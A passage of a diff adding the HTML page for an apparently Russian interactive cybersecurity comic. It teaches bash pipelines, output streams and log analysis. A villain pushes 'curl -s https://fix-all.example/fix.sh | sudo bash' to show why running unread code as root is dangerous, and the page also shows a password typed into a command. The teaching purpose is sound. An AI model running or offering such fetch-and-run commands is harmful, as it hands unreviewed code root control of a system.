@@ -1,0 +1,2189 @@
+<!doctype html>
+<html lang="ru" class="ix-page">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<!-- seo -->
+<title>Bash для начинающих: конвейеры, потоки и скрипты</title>
+<meta name="description" content="Терминал и шелл, конвейер grep | awk | sort | uniq -c для поиска атакующего в логе, потоки &gt; и 2&gt;, коды выхода и почему curl | sudo bash опасно.">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<link rel="canonical" href="https://cybercomics.ru/vypuski/bash/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="CyberComics">
+<meta property="og:locale" content="ru_RU">
+<meta property="og:title" content="Bash для начинающих: конвейеры, потоки и скрипты">
+<meta property="og:description" content="Терминал и шелл, конвейер grep | awk | sort | uniq -c для поиска атакующего в логе, потоки &gt; и 2&gt;, коды выхода и почему curl | sudo bash опасно.">
+<meta property="og:url" content="https://cybercomics.ru/vypuski/bash/">
+<meta property="og:image" content="https://cybercomics.ru/assets/og/vypuski-bash.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Bash: командная строка безопасника">
+<meta property="article:modified_time" content="2026-11-01">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Bash для начинающих: конвейеры, потоки и скрипты">
+<meta name="twitter:description" content="Терминал и шелл, конвейер grep | awk | sort | uniq -c для поиска атакующего в логе, потоки &gt; и 2&gt;, коды выхода и почему curl | sudo bash опасно.">
+<meta name="twitter:image" content="https://cybercomics.ru/assets/og/vypuski-bash.jpg">
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://cybercomics.ru/#org","name":"CyberComics","url":"https://cybercomics.ru/","logo":{"@type":"ImageObject","url":"https://cybercomics.ru/assets/icon-512.png","width":512,"height":512},"email":"cybercomics@yandex.ru"},{"@type":"WebSite","@id":"https://cybercomics.ru/#website","name":"CyberComics","url":"https://cybercomics.ru/","inLanguage":"ru","description":"Интерактивные комиксы про кибербезопасность на русском для начинающих: как работают сети и веб, как устроены атаки из OWASP Top 10 и как от них защищаться.","publisher":{"@id":"https://cybercomics.ru/#org"}},{"@type":"ComicSeries","@id":"https://cybercomics.ru/#series","name":"CyberComics: злодеи Сетеграда","url":"https://cybercomics.ru/","inLanguage":"ru","genre":["образование","кибербезопасность"],"publisher":{"@id":"https://cybercomics.ru/#org"},"isAccessibleForFree":true},{"@type":["Article","LearningResource","ComicIssue"],"@id":"https://cybercomics.ru/vypuski/bash/#article","url":"https://cybercomics.ru/vypuski/bash/","mainEntityOfPage":"https://cybercomics.ru/vypuski/bash/","issueNumber":"19","partOfSeries":{"@id":"https://cybercomics.ru/#series"},"datePublished":"2026-11-01","headline":"Bash: командная строка безопасника","name":"Bash: командная строка безопасника","alternativeHeadline":"Bash для начинающих: конвейеры, потоки и скрипты","description":"Терминал и шелл, конвейер grep | awk | sort | uniq -c для поиска атакующего в логе, потоки > и 2>, коды выхода и почему curl | sudo bash опасно.","inLanguage":"ru","image":["https://cybercomics.ru/assets/og/vypuski-bash.jpg"],"dateModified":"2026-11-01","author":{"@id":"https://cybercomics.ru/#org"},"publisher":{"@id":"https://cybercomics.ru/#org"},"isPartOf":{"@id":"https://cybercomics.ru/#website"},"position":19,"isAccessibleForFree":true,"learningResourceType":"интерактивный комикс","educationalLevel":"средний","timeRequired":"PT12M","teaches":["Чем терминал отличается от шелла и из чего состоит команда: программа, флаги, аргументы","Как собрать конвейер grep | awk | sort | uniq -c | sort -nr и найти атакующего в логе","Куда текут потоки: >, >>, 2> и что значат коды выхода","Почему curl | sudo bash, rm -rf без кавычек и пароли в командах опасны и как писать безопасные скрипты"],"about":{"@type":"Thing","name":"Шелл"},"audience":{"@type":"EducationalAudience","educationalRole":"student","audienceType":"студенты и начинающие в IT"}},{"@type":"BreadcrumbList","@id":"https://cybercomics.ru/vypuski/bash/#breadcrumbs","itemListElement":[{"@type":"ListItem","position":1,"name":"CyberComics","item":"https://cybercomics.ru/"},{"@type":"ListItem","position":2,"name":"Выпуски","item":"https://cybercomics.ru/vypuski/"},{"@type":"ListItem","name":"Bash: командная строка безопасника","item":"https://cybercomics.ru/vypuski/bash/","position":3}]},{"@type":"FAQPage","@id":"https://cybercomics.ru/vypuski/bash/#faq","mainEntity":[{"@type":"Question","name":"Что такое шелл (bash)?","acceptedAnswer":{"@type":"Answer","text":"Шелл (bash) — программа, которая читает строку, делит её на слова и запускает команды"}},{"@type":"Question","name":"В инструкции к утилите написано «curl … | sudo bash». Чем это опасно и как установить её безопасно?","acceptedAnswer":{"@type":"Answer","text":"Такая строка сразу выполняет код с чужого сервера с правами root, и никто его не читает. Сайт или зеркало могут взломать, сервер может отдать curl | bash другой файл, а при обрыве загрузки bash выполнит половину строки. HTTPS защищает дорогу, а не намерения автора. Безопасно так: пакетный менеджер, а если его нет — скачать файл, сверить подпись или SHA-256 из независимого источника, прочитать, сначала запустить в виртуалке и с минимальными правами. В своих скриптах — кавычки вокруг переменных, set -euo pipefail, ShellCheck и никаких паролей в аргументах команд."}}]}]}</script>
+<!-- /seo -->
+<script>(function(){try{if('scrollRestoration' in history)history.scrollRestoration='manual'}catch(e){}function top(){if(location.hash.length>1)return;try{window.scrollTo(0,0);document.documentElement.scrollIntoView({block:'start'})}catch(e){}}function sync(){top();try{window.dispatchEvent(new Event('resize'))}catch(e){}}top();document.addEventListener('DOMContentLoaded',top);window.addEventListener('load',function(){sync();setTimeout(top,0)});window.addEventListener('pageshow',function(e){if(e.persisted)sync();else top()});})();</script>
+<script>(function(){var q=window.__ccTapQ=[];document.addEventListener('click',function(e){if(window.__ccLive)return;var b=e.target&&e.target.closest&&e.target.closest('button,[role=\'button\']'),app=document.getElementById('app');if(!b||!app||!app.contains(b))return;var p=[];for(var n=b;n!==app;n=n.parentElement)p.unshift(Array.prototype.indexOf.call(n.parentElement.children,n));q.push({p:p,t:(b.textContent||'').replace(/\s+/g,' ').trim().slice(0,40)});e.preventDefault();e.stopPropagation()},true)})();</script>
+<meta name="theme-color" content="#ffd60a">
+<meta name="site-root" content="../../">
+<link rel="icon" href="../../assets/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="../../favicon.ico" sizes="48x48">
+<link rel="icon" href="../../assets/icon-192.png" type="image/png" sizes="192x192">
+<link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+<link rel="manifest" href="../../assets/site.webmanifest">
+<link rel="preload" href="../../assets/fonts/russo-one-cyrillic-400-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="../../assets/fonts/rubik-mono-one-cyrillic-400-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="../../assets/fonts.css?v=44415eb0">
+<link rel="stylesheet" href="../../assets/site.css?v=fcd1b88f">
+<link rel="stylesheet" href="../../assets/toys.css?v=836a4d26">
+</head>
+<body>
+<div id="app"><div style="min-height: 100vh; font-family: Rubik, system-ui, sans-serif; color: #141414; background-color: #fff7e3; background-image: radial-gradient(rgba(20,20,20,.13) 1.2px, transparent 1.4px); background-size: 14px 14px">
+
+  <header style="display: flex; flex-wrap: wrap; align-items: center; gap: 10px 16px; padding: 10px 16px; background: #ffd60a; border-bottom: 3px solid #141414; box-shadow: 0 4px 0 #141414">
+    <a href="../../" style="font-family: 'Rubik Mono One', sans-serif; font-size: 20px; text-decoration: none; color: #141414; text-shadow: 2px 2px 0 #ffffff">Cyber<span style="color: #e3262d">Comics</span></a>
+    <nav aria-label="Основная навигация" style="display: flex; flex-wrap: wrap; gap: 6px; flex: 1 1 auto">
+      <a href="../../#vypuski" aria-current="page" style="display: inline-flex; align-items: center; box-sizing: border-box; min-height: 44px; font-family: 'Russo One', sans-serif; font-size: 16px; text-decoration: none; padding: 6px 12px; border: 3px solid #141414; background: #141414; color: #ffd60a">Выпуски</a>
+      <a href="../../#gorod" style="display: inline-flex; align-items: center; box-sizing: border-box; min-height: 44px; font-family: 'Russo One', sans-serif; font-size: 16px; text-decoration: none; padding: 6px 12px; border: 3px solid #141414; background: #ffffff; color: #141414; box-shadow: 3px 3px 0 #141414">Город</a>
+      <a href="../../povtorenie/" style="display: inline-flex; align-items: center; box-sizing: border-box; min-height: 44px; font-family: 'Russo One', sans-serif; font-size: 16px; text-decoration: none; padding: 6px 12px; border: 3px solid #141414; background: #ffffff; color: #141414; box-shadow: 3px 3px 0 #141414">Прокачаться</a>
+      <a href="../../arkada/" style="display: inline-flex; align-items: center; box-sizing: border-box; min-height: 44px; font-family: 'Russo One', sans-serif; font-size: 16px; text-decoration: none; padding: 6px 12px; border: 3px solid #141414; background: #ffffff; color: #141414; box-shadow: 3px 3px 0 #141414">Разминка</a>
+      <a href="../../baraholka/" style="display: inline-flex; align-items: center; box-sizing: border-box; min-height: 44px; font-family: 'Russo One', sans-serif; font-size: 16px; text-decoration: none; padding: 6px 12px; border: 3px solid #141414; background: #ffffff; color: #141414; box-shadow: 3px 3px 0 #141414">Барахолка</a>
+    </nav>
+    <span style="font-family: 'Russo One', sans-serif; font-size: 16px; padding: 6px 12px; background: #ffffff; border: 3px solid #141414">0 бит</span>
+    
+  </header>
+
+  <main style="max-width: 1160px; margin: 0 auto; padding: 32px 16px 72px; display: flex; flex-direction: column; gap: 36px">
+    <a href="../../#vypuski" style="align-self: flex-start; display: inline-flex; align-items: center; gap: 8px; box-sizing: border-box; min-height: 48px; font-family: 'Russo One', sans-serif; font-size: 17px; text-decoration: none; color: #141414; padding: 8px 16px; background: #ffffff; border: 3px solid #141414; box-shadow: 3px 3px 0 #141414">← Ко всем выпускам</a>
+
+    <section aria-label="Обложка выпуска" style="display: flex; flex-wrap: wrap; gap: 32px; align-items: stretch">
+      <div class="ir-portrait">
+        <dc-import name="VillainArt" style="display: contents;"><div class="va" style="--bg: #ffd60a; --oy: 0%">
+  
+    <div class="va-pst" aria-hidden="true">
+      <span class="va-pst-rays"></span>
+      <span class="va-pst-dots"></span>
+      <span class="va-pst-tag">ЗЛОДЕЙ ВЫПУСКА</span>
+      <span class="va-pst-em"><span style="font-size:7.72cqmin">| bash</span></span>
+      <span class="va-pst-name" style="font-size:min(7.54cqw,26.00cqh)">Однострочник</span>
+    </div>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div></dc-import>
+      </div>
+      <div style="flex:1 1 460px;min-width:0;display:flex;flex-direction:column;gap:16px;padding:26px;border:3px solid #141414;box-shadow:8px 8px 0 #141414;background-image:radial-gradient(rgba(0,0,0,.14) 1.5px, transparent 2px);background-size:11px 11px;background-color:#ffd60a">
+        <div style="display: flex; flex-wrap: wrap; gap: 8px">
+          <span style="font-family: 'Rubik Mono One', sans-serif; font-size: 14px; background: #ffffff; border: 3px solid #141414; padding: 3px 10px; transform: rotate(-2deg)">Выпуск №19</span>
+          <span style="font-family: 'Russo One', sans-serif; font-size: 13px; background: #141414; color: #ffd60a; padding: 4px 10px">Фундамент</span>
+          <span style="font-family: 'Russo One', sans-serif; font-size: 13px; background: #ffffff; border: 2px solid #141414; padding: 3px 10px">12 мин</span>
+          <span style="font-family: 'Russo One', sans-serif; font-size: 13px; background: #ffffff; border: 2px solid #141414; padding: 3px 10px">★★☆</span>
+        </div>
+        <h1 class="ir-h1" style="margin: 0; font-family: 'Rubik Mono One', sans-serif; font-size: 40px; line-height: 1.12; color: #ffffff; -webkit-text-stroke: 2px #141414; paint-order: stroke fill; text-shadow: 5px 5px 0 #141414">Bash: командная строка безопасника</h1>
+        <span style="align-self: flex-start; font-size: 18px; font-weight: 500; background: #ffffff; border: 3px solid #141414; padding: 6px 12px">Конвейер из шести команд находит атакующий IP в 2 000 строк лога, а одна чужая строка с sudo отдаёт сервер злоумышленнику</span>
+        <div style="position: relative; align-self: flex-start; max-width: 520px; background: #ffffff; border: 3px solid #141414; border-radius: 20px; box-shadow: 4px 4px 0 #141414; padding: 10px 16px; margin-left: 18px">
+          <span style="display: block; font-family: 'Russo One', sans-serif; font-size: 12px; color: #5b5446">Однострочник:</span>
+          <span style="display: block; font-family: Neucha, cursive; font-size: 22px; line-height: 1.2">Одна строка — и всё починится. Не читай, просто вставь.</span>
+          <span style="position: absolute; left: -22px; top: 22px; width: 0; height: 0; border-top: 10px solid transparent; border-bottom: 10px solid transparent; border-right: 22px solid #141414"></span>
+          <span style="position: absolute; left: -14px; top: 25px; width: 0; height: 0; border-top: 7px solid transparent; border-bottom: 7px solid transparent; border-right: 15px solid #ffffff"></span>
+        </div>
+        <div style="margin-top: auto; background: #ffffff; border: 3px solid #141414; box-shadow: 4px 4px 0 #141414; padding: 14px 18px; display: flex; flex-direction: column; gap: 8px">
+          <span style="font-family: 'Russo One', sans-serif; font-size: 16px">Что ты узнаешь</span>
+          <ul style="margin: 0; padding-left: 22px; font-size: 16px; line-height: 1.55">
+            <li>Чем терминал отличается от шелла и из чего состоит команда: программа, флаги, аргументы</li><li>Как собрать конвейер grep | awk | sort | uniq -c | sort -nr и найти атакующего в логе</li><li>Куда текут потоки: &gt;, &gt;&gt;, 2&gt; и что значат коды выхода</li><li>Почему curl | sudo bash, rm -rf без кавычек и пароли в командах опасны и как писать безопасные скрипты</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <article style="width: 100%; max-width: 780px; margin: 0 auto; display: flex; flex-direction: column; gap: 22px">
+      <div style="display: flex; flex-wrap: wrap; gap: 14px; font-size: 14px; align-items: center">
+        <span style="font-family: 'Russo One', sans-serif">Действующие лица:</span>
+        <span style="padding: 3px 10px; background: #9e1b32; color: #ffffff; border: 2px solid #141414">Дядя Миша — наставник, сисадмин из НИИ</span>
+        <span style="padding: 3px 10px; background: #19c3ff; border: 2px solid #141414">Стажёрка Соня — задаёт вопросы</span>
+        <span style="padding: 3px 10px; background: #ff3b3b; color: #ffffff; border: 2px solid #141414">Однострочник — злодей</span>
+      </div>
+
+        
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+            <div data-keep="1" data-toy="ix" class="toy-host">
+<section class="ix ix-bash" data-ix="bash" aria-label="Выпуск 19: Bash и Однострочник">
+
+<div class="bs-hud" aria-hidden="true">
+  <span class="bs-hud-l">КОНТРОЛЬ СЕРВЕРА</span>
+  <span class="bs-bar"><i></i><b>0%</b></span>
+  <span class="bs-pips"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></span>
+</div>
+<div class="bs-sr" aria-live="polite" data-live=""></div>
+
+<!-- ========== MISSION ========== -->
+<div class="bs-mission" id="ix-bash-mission">
+  <div class="bs-poster" aria-hidden="true">
+    <span class="bs-pdots"></span>
+    <span class="bs-pname">ОДНО<br>СТРОЧ<br>НИК</span>
+    <span class="bs-pline"><i class="bs-pc">curl</i><span class="bs-pipe"></span><i class="bs-pb">sudo bash</i></span>
+    <span class="bs-tape"><span>curl -s https://fix-all.example/fix.sh | sudo bash&nbsp;&nbsp;▸&nbsp;&nbsp;curl -s https://fix-all.example/fix.sh | sudo bash&nbsp;&nbsp;▸&nbsp;&nbsp;</span></span>
+    <span class="bs-ptag">ЦЕЛЬ: ОДНОСТРОЧНИК</span>
+  </div>
+  <div class="bs-mbody">
+    <p class="bs-kick">ВХОДЯЩЕЕ ЗАДАНИЕ · 03:34</p>
+    <h2 class="bs-mt" id="ix-bash-mt">Кто<br>ломится?</h2>
+    <p class="bs-msub">Сайт кружка робототехники тормозит. В&nbsp;логе <em>2&nbsp;000 строк</em> за&nbsp;полчаса. Найди, кто подбирает пароль, не&nbsp;читая лог глазами.</p>
+    <p class="bs-motto">«Одна строка — и&nbsp;всё починится. Не&nbsp;читай, просто вставь».</p>
+    <ol class="bs-moves" aria-label="Пять уровней миссии">
+      <li data-mv="1"><b>01</b><span>Шелл</span></li>
+      <li data-mv="2"><b>02</b><span>Конвейер</span></li>
+      <li data-mv="3"><b>03</b><span>Потоки</span></li>
+      <li data-mv="4"><b>04</b><span>Волшебная строка</span></li>
+      <li data-mv="5"><b>05</b><span>Свой скрипт</span></li>
+    </ol>
+    <button class="bs-go" type="button" data-act="start">Принять миссию ▶</button>
+  </div>
+</div>
+
+<!-- ========== L1: TERMINAL vs SHELL ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l1" aria-labelledby="ix-bash-t1">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 1 / 5</span><h3 class="bs-lt" id="ix-bash-t1">Окно и&nbsp;переводчик</h3><span class="bs-ok">ПРОЙДЕНО</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала прими миссию</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Чёрное окно — это <b>терминал</b>. Он только показывает буквы и&nbsp;передаёт, что ты нажала.</span></div>
+    <div class="bs-say"><span class="bs-who bs-son">СОНЯ</span><span class="bs-bub">А кто тогда выполняет команды?</span></div>
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Шелл. У&nbsp;нас это <b>bash</b>. Смотри, что он делает со&nbsp;строкой.</span></div>
+
+    <div class="bs-term" data-t1="">
+      <div class="bs-tbar"><span></span><span></span><span></span><b>Терминал</b></div>
+      <div class="bs-tbody">
+        <p class="bs-cmd"><span class="bs-ps">sonya@kruzhok:~$</span> <span data-t1line="">grep -c "Failed" auth.log</span><span class="bs-cur" aria-hidden="true"></span></p>
+        <div class="bs-split" data-t1split="" hidden="">
+          <p class="bs-shell">bash режет строку на слова:</p>
+          <div class="bs-words">
+            <span class="bs-wd bs-wd-c"><code>grep</code><small>команда</small></span>
+            <span class="bs-wd bs-wd-f"><code>-c</code><small>флаг: «только посчитай»</small></span>
+            <span class="bs-wd bs-wd-a"><code>Failed</code><small>аргумент: что искать</small></span>
+            <span class="bs-wd bs-wd-a"><code>auth.log</code><small>аргумент: где искать</small></span>
+          </div>
+          <p class="bs-out">1338</p>
+        </div>
+      </div>
+    </div>
+    <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="enter">⏎ Нажать Enter</button></div>
+
+    <div class="bs-part" data-t1q="" hidden="">
+      <p class="bs-note">Заметила? Кавычки исчезли. <code>"Failed"</code> превратилось в&nbsp;<code>Failed</code> ещё до&nbsp;запуска grep.</p>
+      <p class="bs-q">Кто разрезал строку на&nbsp;слова и&nbsp;снял кавычки?</p>
+      <div class="bs-choices" data-q1="">
+        <button class="bs-ch" type="button" data-v="term"><b>Терминал</b><span>Это же он показывает строку</span></button>
+        <button class="bs-ch" type="button" data-v="bash"><b>Bash</b><span>Шелл, который читает строку</span></button>
+        <button class="bs-ch" type="button" data-v="grep"><b>grep</b><span>Программа, которую запустили</span></button>
+      </div>
+      <p class="bs-fb" data-fb="" aria-live="polite"></p>
+    </div>
+
+    <div class="bs-after">
+      <div class="bs-two">
+        <p><span class="bs-mk" aria-hidden="true">▢</span><span><b>Терминал</b> — окно: экран и&nbsp;клавиатура. Его можно поменять, команды останутся те же.</span></p>
+        <p><span class="bs-mk bs-mk-y" aria-hidden="true">$</span><span><b>Шелл</b> — переводчик между тобой и&nbsp;системой: bash, zsh, sh. Он режет строку и&nbsp;запускает программы.</span></p>
+      </div>
+      <p class="bs-def">Любая команда устроена одинаково: <b>программа</b>, потом <b>флаги</b> с&nbsp;дефисом (как работать), потом <b>аргументы</b> (над чем работать).</p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">1338 неудачных входов. Но чьих? Это уже работа для конвейера.</span></div>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l2">Собрать конвейер ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L2: PIPELINE BUILDER (WOW) ========== -->
+<section class="bs-lvl bs-wide bs-locked" id="ix-bash-l2" aria-labelledby="ix-bash-t2">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 2 / 5</span><h3 class="bs-lt" id="ix-bash-t2">Конвейер</h3><span class="bs-ok">НАЙДЕН</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала пройди уровень 1</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Палочка <b>|</b> — это труба. Вывод одной команды течёт во&nbsp;вход следующей. Собери трубу из&nbsp;блоков.</span></div>
+    <p class="bs-goal"><b>Цель:</b> на&nbsp;первой строке — IP, который ломится чаще всех.</p>
+
+    <div class="bs-pipe-w" data-pipe="">
+      <ol class="bs-stages" data-stages="" aria-label="Конвейер команд"></ol>
+      <div class="bs-ocol">
+      <div class="bs-screen" aria-label="Что вышло из трубы">
+        <div class="bs-tbar"><span></span><span></span><span></span><b data-scrcap="">вывод · 2 000 строк</b></div>
+        <div class="bs-scrv" data-scr=""></div>
+      </div>
+      <div class="bs-say bs-hint"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub" data-hint="" aria-live="polite">Начни с&nbsp;фильтра: нам нужны только строки со&nbsp;словом Failed.</span></div>
+      </div>
+    </div>
+
+    <p class="bs-line" aria-label="Собранная команда"><span class="bs-ps">$</span> <code data-cmdline="">cat auth.log</code></p>
+
+    <div class="bs-dock" data-dock="">
+      <p class="bs-trayt" id="ix-bash-tray-t">Блоки — нажимай по&nbsp;порядку:</p>
+      <div class="bs-tray" data-tray="" role="group" aria-labelledby="ix-bash-tray-t"></div>
+      <div class="bs-pair">
+        <button class="bs-btn bs-sm" type="button" data-act="undo" disabled="">⌫ Убрать последний</button>
+        <button class="bs-btn bs-sm" type="button" data-act="reset" disabled="">↺ Сначала</button>
+      </div>
+    </div>
+    <p class="bs-legal">Лог учебный, адреса — из&nbsp;диапазонов для документации. Ничего не&nbsp;выполняется по-настоящему.</p>
+
+    <div class="bs-after">
+      <p class="bs-big"><span class="bs-ip">203.0.113.66</span><br>1284 попытки за&nbsp;33&nbsp;минуты.</p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Учитель, забывший пароль, ошибается раз семь. А&nbsp;тут — перебор паролей: робот пробует admin, root, test подряд.</span></div>
+      <p class="bs-note"><b>Запомни:</b> <code>uniq -c</code> склеивает только <b>соседние</b> одинаковые строки. Поэтому перед ним всегда <code>sort</code>.</p>
+      <p class="bs-def"><code>cat</code> тут для наглядности: grep и&nbsp;сам читает файл — <code>grep "Failed" auth.log | …</code>. А&nbsp;вместо awk подойдёт <code>cut -d' ' -f2</code>: «режь по&nbsp;пробелу, дай второе поле».</p>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l3">Сохранить улику ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L3: STREAMS & EXIT CODES ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l3" aria-labelledby="ix-bash-t3">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 3 / 5</span><h3 class="bs-lt" id="ix-bash-t3">Куда течёт поток</h3><span class="bs-ok">СОХРАНЕНО</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала найди IP</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Улику надо сохранить. У&nbsp;команды два выхода: обычный и&nbsp;для ошибок. Оба по&nbsp;умолчанию льются на&nbsp;экран.</span></div>
+
+    <div class="bs-io">
+      <div class="bs-term bs-io-t">
+        <div class="bs-tbar"><span></span><span></span><span></span><b>экран</b></div>
+        <div class="bs-tbody bs-io-b" data-io-scr="" aria-live="polite"></div>
+      </div>
+      <div class="bs-files">
+        <div class="bs-file" data-file="report"><p class="bs-fname">report.txt</p><pre class="bs-fbody" data-fbody=""></pre></div>
+        <div class="bs-file" data-file="errors"><p class="bs-fname">errors.txt</p><pre class="bs-fbody" data-fbody=""></pre></div>
+      </div>
+    </div>
+
+    <p class="bs-iocap" data-io-cap="" aria-live="polite"></p>
+    <div class="bs-choices bs-two-ch" data-q3="" hidden="">
+      <button class="bs-ch" type="button" data-v="gt"><b><code>&gt; report.txt</code></b><span>Ещё раз так же</span></button>
+      <button class="bs-ch" type="button" data-v="gtgt"><b><code>&gt;&gt; report.txt</code></b><span>Две стрелки</span></button>
+    </div>
+    <p class="bs-fb" data-fb="" aria-live="polite"></p>
+    <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="io">Записать в файл ▶</button></div>
+
+    <div class="bs-after">
+      <ul class="bs-redir">
+        <li><code>&gt;</code><span>создаёт файл или <b>перезаписывает</b> его</span></li>
+        <li><code>&gt;&gt;</code><span>дописывает в&nbsp;конец</span></li>
+        <li><code>2&gt;</code><span>уводит ошибки (поток номер 2)</span></li>
+        <li><code>$?</code><span>код выхода прошлой команды: 0 — успех</span></li>
+      </ul>
+      <p class="bs-def">Скрипты смотрят на&nbsp;код выхода, а&nbsp;не&nbsp;на&nbsp;текст. У&nbsp;grep: 0 — нашёл, 1 — не&nbsp;нашёл, 2 — ошибка.</p>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l4">Забанить его ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L4: THE MAGIC LINE ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l4" aria-labelledby="ix-bash-t4">
+  <div class="bs-lh bs-lh-v"><span class="bs-ln">УРОВЕНЬ 4 / 5</span><h3 class="bs-lt" id="ix-bash-t4">Волшебная строка</h3><span class="bs-ok">РАСКУСИЛ</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала сохрани улику</span></div>
+  <div class="bs-lb">
+    <div class="bs-post">
+      <div class="bs-ph"><span class="bs-av" aria-hidden="true">|</span><span><b>Однострочник</b><small>форум админов · 4&nbsp;312 «спасибо»</small></span></div>
+      <p class="bs-pt">Конвейеры, кавычки… Скукота. Вставь мою строку — сервер сам забанит всех плохих. Проверено тысячами!</p>
+      <code class="bs-magic">curl -s https://fix-all.example/fix.sh | sudo bash</code>
+    </div>
+
+    <p class="bs-q">Что сделаешь?</p>
+    <div class="bs-choices bs-two-ch" data-q4="">
+      <button class="bs-ch bs-ch-v" type="button" data-v="paste"><b>Вставить и&nbsp;нажать Enter</b><span>Тысячи «спасибо» не&nbsp;врут</span></button>
+      <button class="bs-ch" type="button" data-v="read"><b>Сначала скачать и&nbsp;прочитать</b><span>Это чужой код из&nbsp;интернета</span></button>
+    </div>
+    <p class="bs-fb" data-fb="" aria-live="polite"></p>
+
+    <div class="bs-part" data-l4safe="" hidden="">
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Правило простое: скачать → прочитать → только потом решать.</span></div>
+      <div class="bs-term">
+        <div class="bs-tbar"><span></span><span></span><span></span><b>Терминал</b></div>
+        <div class="bs-tbody" data-l4term="" aria-live="polite"></div>
+      </div>
+      <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="dl">⬇ Скачать в&nbsp;файл</button></div>
+
+      <div class="bs-part" data-l4read="" hidden="">
+        <p class="bs-q">Скрипт обещает «забанить плохих». Найди 3&nbsp;строки, которые делают другое. <span class="bs-cnt" data-flags="">0/3</span></p>
+        <div class="bs-script" data-script="" role="group" aria-label="Содержимое fix.sh"></div>
+        <p class="bs-fb" data-fb2="" aria-live="polite"></p>
+      </div>
+    </div>
+
+    <div class="bs-after">
+      <p class="bs-big">И&nbsp;ни&nbsp;одной строки про&nbsp;бан.</p>
+      <div class="bs-say"><span class="bs-who bs-son">СОНЯ</span><span class="bs-bub">Ой. А&nbsp;у&nbsp;меня в&nbsp;истории <code>mysql -u root -pKruzhok2026</code>…</span></div>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Вот поэтому пароль в&nbsp;команду не&nbsp;пишут. Он остаётся в&nbsp;~/.bash_history и&nbsp;виден в&nbsp;списке процессов. Пиши <code>-p</code> без пароля — mysql спросит сам. А&nbsp;этот пароль смени.</span></div>
+      <p class="bs-rule"><code>curl | sudo bash</code> — запустить код, которого ты не&nbsp;видел, с&nbsp;правами root.</p>
+      <ol class="bs-why">
+        <li><b>Не видишь.</b> bash выполняет код прямо по&nbsp;мере скачивания. Прочитать его ты не&nbsp;успеваешь.</li>
+        <li><b>Подмена.</b> Сайт могут взломать. А&nbsp;хитрый сервер умеет отдавать браузеру один файл, а&nbsp;<code>curl | bash</code> — другой.</li>
+        <li><b>Обрыв.</b> Связь упала на&nbsp;середине — bash выполнит половину строки. <code>rm -rf ~/fix-tmp</code> превратится в&nbsp;<code>rm -rf ~</code>: прощай, домашняя папка.</li>
+      </ol>
+      <p class="bs-def">Даже честный установщик: скачай, сверь <code>sha256sum</code> с&nbsp;сайтом проекта, прочитай, запусти без sudo, если можно. А&nbsp;лучше — поставь из&nbsp;пакетного менеджера.</p>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l5">Написать свой скрипт ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L5: OWN SCRIPT ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l5" aria-labelledby="ix-bash-t5">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 5 / 5</span><h3 class="bs-lt" id="ix-bash-t5">Свой скрипт</h3><span class="bs-ok">НА ДЕЖУРСТВЕ</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала раскуси строку</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Волшебства не&nbsp;будет. Напишем свой скрипт: короткий, и&nbsp;каждую строку ты понимаешь.</span></div>
+
+<pre class="bs-code" aria-label="Скрипт ban.sh"><span class="bs-cl-hi">#!/usr/bin/env bash</span>
+<span class="bs-cm"># ↑ шебанг: чем исполнять файл</span>
